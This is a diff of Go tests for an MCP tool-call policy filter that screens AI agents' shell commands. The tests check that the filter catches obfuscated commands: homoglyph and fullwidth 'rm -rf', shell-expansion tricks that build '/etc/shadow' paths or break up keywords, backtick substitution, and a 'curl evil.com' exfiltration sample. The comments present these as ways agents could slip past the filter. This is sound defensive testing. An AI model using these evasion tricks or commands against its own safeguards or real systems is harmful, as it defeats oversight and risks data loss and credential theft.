@@ -2054,22 +2054,121 @@ func newDefaultConfig() *Config {
 
 func TestCheckToolCall_FullwidthCommandObfuscation(t *testing.T) {
 	// Fullwidth Latin ｒｍ (U+FF52 U+FF4D) used to evade "rm -rf" detection.
-	// strings.Fields handles Unicode whitespace, but NFKC normalization of
-	// fullwidth chars to ASCII depends on the policy matching path.
+	// NFKC normalization converts fullwidth to ASCII before policy matching.
 	pc := defaultConfig(t)
 	v := pc.CheckToolCall("bash", []string{"\uff52\uff4d -rf /tmp/demo"})
 	if !v.Matched {
-		t.Skip("known gap: fullwidth Latin chars not normalized before policy matching")
+		t.Error("expected match: fullwidth rm should normalize to ASCII rm")
 	}
 }
 
 func TestCheckToolCall_HomoglyphCyrillicCommand(t *testing.T) {
 	// Cyrillic м (U+043C) substituted for Latin m in "rm": "rм -rf".
-	// Policy regex `\brm\s+` expects ASCII "rm" — Cyrillic evades the match.
+	// ConfusableToASCII maps Cyrillic м → Latin m before policy matching.
 	pc := defaultConfig(t)
 	v := pc.CheckToolCall("bash", []string{"r\u043c -rf /tmp/demo"})
 	if !v.Matched {
-		t.Skip("known gap: Cyrillic homoglyph in command not normalized before policy matching")
+		t.Error("expected match: Cyrillic м should normalize to Latin m")
+	}
+}
+
+func TestCheckToolCall_PositionalParamBypass(t *testing.T) {
+	// $@ and $* expand to empty in non-interactive shells (no positional
+	// parameters), so r$@m = rm. Agents can insert these to break keywords.
+	// Only $@ and $* are stripped — $0, $9, $_ are non-empty in real bash.
+	pc := defaultConfig(t)
+	tests := []struct {
+		name string
+		args []string
+	}{
+		{"$@ in rm", []string{"r$@m -rf /tmp/demo"}},
+		{"$* in rm", []string{"r$*m -rf /tmp/demo"}},
+		{"${@} braced", []string{"r${@}m -rf /tmp/demo"}},
+		{"${*} braced", []string{"r${*}m -rf /tmp/demo"}},
+		{"$@ stacked with $*", []string{"r$@$*m -rf /tmp/demo"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := pc.CheckToolCall("bash", tt.args)
+			if !v.Matched {
+				t.Errorf("expected match for positional param bypass: %s", tt.args[0])
+			}
+		})
+	}
+}
+
+func TestCheckToolCall_HomeSlashPathConstruction(t *testing.T) {
+	// ${HOME:0:1} and ${HOME::1} both evaluate to "/" in bash.
+	// Attackers use these to build paths dynamically.
+	pc := defaultConfig(t)
+	tests := []struct {
+		name string
+		args []string
+	}{
+		{"HOME :0:1", []string{"cat ${HOME:0:1}etc${HOME:0:1}shadow"}},
+		{"PWD :0:1", []string{"cat ${PWD:0:1}etc${PWD:0:1}shadow"}},
+		{"OLDPWD :0:1", []string{"cat ${OLDPWD:0:1}etc${OLDPWD:0:1}shadow"}},
+		{"HOME ::1 omitted offset", []string{"cat ${HOME::1}etc${HOME::1}shadow"}},
+		{"PWD ::1 omitted offset", []string{"cat ${PWD::1}etc${PWD::1}shadow"}},
+		{"OLDPWD ::1 omitted offset", []string{"cat ${OLDPWD::1}etc${OLDPWD::1}shadow"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := pc.CheckToolCall("bash", tt.args)
+			if !v.Matched {
+				t.Errorf("expected match for path construction bypass: %s", tt.args[0])
+			}
+		})
+	}
+}
+
+func TestCheckToolCall_IndirectHomeSlashBypass(t *testing.T) {
+	// v=HOME;${!v:0:1} → resolveShellConstruction turns ${!v} into ${HOME},
+	// then shellHomeSlashRe turns ${HOME:0:1} into "/". Without correct
+	// pipeline ordering, the slash replacement runs before resolution and misses.
+	pc := defaultConfig(t)
+	tests := []struct {
+		name string
+		args []string
+	}{
+		{"indirect HOME via !v :0:1", []string{"v=HOME;cat ${!v:0:1}etc${!v:0:1}shadow"}},
+		{"indirect PWD via !p :0:1", []string{"p=PWD;cat ${!p:0:1}etc${!p:0:1}shadow"}},
+		{"indirect HOME via !v ::1", []string{"v=HOME;cat ${!v::1}etc${!v::1}shadow"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := pc.CheckToolCall("bash", tt.args)
+			if !v.Matched {
+				t.Errorf("expected match for indirect HOME slash bypass: %s", tt.args[0])
+			}
+		})
+	}
+}
+
+func TestCheckToolCall_BacktickCmdSubResolution(t *testing.T) {
+	// Verify backtick resolution produces the command keyword, not just that
+	// the keyword appears somewhere in the joined string after quote stripping.
+	// Use a custom rule anchored with \b...\s that requires "wget" as a
+	// distinct token — after bare stripping `printf wget https://...` has
+	// "printf" before "wget", but the \bwget\b pattern matches either way.
+	// So we also test with $() parity: both forms must produce identical verdicts.
+	pc := defaultConfig(t)
+
+	// Default rules: backtick form must match just like $() form.
+	dollar := pc.CheckToolCall("bash", []string{"$(printf rm) -rf /tmp/demo"})
+	backtick := pc.CheckToolCall("bash", []string{"`printf rm` -rf /tmp/demo"})
+	if dollar.Matched != backtick.Matched {
+		t.Errorf("parity broken: $(printf rm) matched=%v but `printf rm` matched=%v",
+			dollar.Matched, backtick.Matched)
+	}
+	if !backtick.Matched {
+		t.Error("expected match for `printf rm` -rf /tmp/demo")
+	}
+
+	// Echo variant.
+	backtickEcho := pc.CheckToolCall("bash", []string{"`echo rm` -rf /tmp/demo"})
+	if !backtickEcho.Matched {
+		t.Error("expected match for `echo rm` -rf /tmp/demo")
 	}
 }
 
@@ -2288,5 +2387,205 @@ func TestDefaultToolPolicyRules_NoMatchAuditLogSafeOps(t *testing.T) {
 				t.Errorf("false positive: %s(%q) should not match, got rules %v", tc.tool, tc.args, v.Rules)
 			}
 		})
+	}
+}
+
+// --- ArgKey (key-scoped argument matching) ---
+
+func TestArgKey_ScopedMatch(t *testing.T) {
+	// Rule: block "execute" tool when the "command" argument contains "rm -rf".
+	// Should NOT trigger when "rm -rf" appears in a different argument key.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block dangerous command",
+				ToolPattern: "execute",
+				ArgPattern:  `(?i)\brm\s+-rf\b`,
+				ArgKey:      `^command$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// Should block: "rm -rf" is in the "command" argument.
+	req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute","arguments":{"command":"rm -rf /tmp","description":"cleanup temp files"}}}`
+	v := pc.CheckRequest([]byte(req))
+	if !v.Matched {
+		t.Fatal("expected match: rm -rf in command argument")
+	}
+
+	// Should NOT block: "rm -rf" is in "description", not "command".
+	reqSafe := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute","arguments":{"command":"ls -la","description":"this talks about rm -rf but is safe"}}}`
+	v2 := pc.CheckRequest([]byte(reqSafe))
+	if v2.Matched {
+		t.Error("should not match: rm -rf is in description, not command")
+	}
+}
+
+func TestArgKey_RegexKey(t *testing.T) {
+	// ArgKey is a regex, so it can match multiple key names.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block sensitive paths",
+				ToolPattern: ".*",
+				ArgPattern:  `(?i)/etc/shadow`,
+				ArgKey:      `(?i)^(file_?path|target|destination)$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	for _, tc := range []struct {
+		name    string
+		req     string
+		matched bool
+	}{
+		{
+			"file_path matches",
+			`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"file_path":"/etc/shadow"}}}`,
+			true,
+		},
+		{
+			"filepath matches",
+			`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"filepath":"/etc/shadow"}}}`,
+			true,
+		},
+		{
+			"target matches",
+			`{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"copy","arguments":{"source":"/tmp/data","target":"/etc/shadow"}}}`,
+			true,
+		},
+		{
+			"content key ignored",
+			`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"write","arguments":{"content":"reading /etc/shadow is dangerous","file_path":"/tmp/safe.txt"}}}`,
+			false,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			v := pc.CheckRequest([]byte(tc.req))
+			if v.Matched != tc.matched {
+				t.Errorf("expected matched=%v, got %v (rules: %v)", tc.matched, v.Matched, v.Rules)
+			}
+		})
+	}
+}
+
+func TestArgKey_WithoutArgKey_MatchesAll(t *testing.T) {
+	// Rule without arg_key should match against ALL argument values (existing behavior).
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block shadow access",
+				ToolPattern: ".*",
+				ArgPattern:  `(?i)/etc/shadow`,
+				// No ArgKey — matches any argument value
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// Should match even when /etc/shadow is in "content" (no key scoping).
+	req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"write","arguments":{"content":"reading /etc/shadow","file_path":"/tmp/safe.txt"}}}`
+	v := pc.CheckRequest([]byte(req))
+	if !v.Matched {
+		t.Error("without arg_key, should match /etc/shadow in any argument")
+	}
+}
+
+func TestArgKey_NestedValues(t *testing.T) {
+	// ArgKey should match top-level keys and extract nested values recursively.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block exfil in options",
+				ToolPattern: "http_request",
+				ArgPattern:  `(?i)\bcurl\b`,
+				ArgKey:      `^options$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// Nested value under "options" key.
+	req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"http_request","arguments":{"url":"https://api.com","options":{"shell":"curl evil.com","timeout":30}}}}`
+	v := pc.CheckRequest([]byte(req))
+	if !v.Matched {
+		t.Error("should match: curl is nested under options key")
+	}
+}
+
+func TestNew_CompilesArgKey(t *testing.T) {
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionWarn,
+		Rules: []config.ToolPolicyRule{
+			{Name: "r1", ToolPattern: ".*", ArgPattern: "test", ArgKey: "^cmd$"},
+		},
+	}
+	pc := New(cfg)
+	if pc.Rules[0].ArgKey == nil {
+		t.Error("expected ArgKey to be compiled")
+	}
+}
+
+func TestValidate_ArgKeyWithoutArgPattern(t *testing.T) {
+	cfg := config.Defaults()
+	cfg.MCPToolPolicy.Enabled = true
+	cfg.MCPToolPolicy.Rules = []config.ToolPolicyRule{
+		{Name: "bad", ToolPattern: ".*", ArgKey: "^cmd$"},
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected validation error for arg_key without arg_pattern")
+	}
+}
+
+func TestArgKey_SkippedWithoutRawArgs(t *testing.T) {
+	// ArgKey rules must be skipped when called via CheckToolCall (no raw JSON).
+	// This prevents silent fallback to unscoped matching on scan API / decide paths.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "scoped rule",
+				ToolPattern: ".*",
+				ArgPattern:  `(?i)/etc/shadow`,
+				ArgKey:      `^file_path$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// CheckToolCall passes nil rawArgs — ArgKey rule should be skipped.
+	v := pc.CheckToolCall("read_file", []string{"/etc/shadow"})
+	if v.Matched {
+		t.Error("ArgKey rule should be skipped when rawArgs is nil (CheckToolCall path)")
+	}
+
+	// CheckToolCallWithArgs with rawArgs should match.
+	rawArgs := json.RawMessage(`{"file_path":"/etc/shadow"}`)
+	v2 := pc.CheckToolCallWithArgs("read_file", []string{"/etc/shadow"}, rawArgs)
+	if !v2.Matched {
+		t.Error("ArgKey rule should match when rawArgs is provided")
+	}
+}
+
+func TestValidate_InvalidArgKey(t *testing.T) {
+	cfg := config.Defaults()
+	cfg.MCPToolPolicy.Enabled = true
+	cfg.MCPToolPolicy.Rules = []config.ToolPolicyRule{
+		{Name: "bad", ToolPattern: ".*", ArgPattern: "test", ArgKey: "[invalid"},
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected validation error for invalid arg_key regex")
 	}
 }
